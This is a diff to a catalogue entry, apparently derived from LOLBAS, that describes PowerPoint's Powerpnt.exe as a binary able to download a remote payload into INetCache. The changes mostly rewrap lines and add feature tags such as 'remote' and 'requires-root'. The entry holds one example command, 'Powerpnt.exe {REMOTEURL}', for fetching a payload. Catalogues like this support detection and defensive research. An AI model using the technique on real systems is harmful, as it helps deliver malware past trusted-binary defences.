@@ -2,7 +2,9 @@
 id: windows-download-powerpnt
 namespace: windows:download:powerpnt
 name: powerpnt
-description: 'Microsoft Office binary. Located at: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\Powerpnt.exe; C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\Powerpnt.exe; C:\Program Files (x86)\Microsoft Office\Office16\Powerpnt.exe.'
+description: 'Microsoft Office binary. Located at: C:\Program Files (x86)\Microsoft
+  Office 16\ClientX86\Root\Office16\Powerpnt.exe; C:\Program Files\Microsoft Office
+  16\ClientX64\Root\Office16\Powerpnt.exe; C:\Program Files (x86)\Microsoft Office\Office16\Powerpnt.exe.'
 author: Reegun J (OCBC Bank)
 version: 1.0.0
 capabilities:
@@ -41,7 +43,13 @@ resource_profile:
 allowed-tools:
 - powerpnt
 parameters: []
-features: []
+features:
+- file-system
+- local
+- network-intensive
+- pipes-stdout
+- remote
+- requires-root
 execution:
   template: powerpnt
   sandbox: execFile
@@ -49,7 +57,8 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Downloads payload from remote server (It will download a remote payload and place it in INetCache.)
+- description: Downloads payload from remote server (It will download a remote payload
+    and place it in INetCache.)
   command: Powerpnt.exe {REMOTEURL}
 references:
 - label: '1150032506504151040'
@@ -71,7 +80,6 @@ install:
   commands:
   - choco install powerpnt
 ---
-
 
 # powerpnt
 
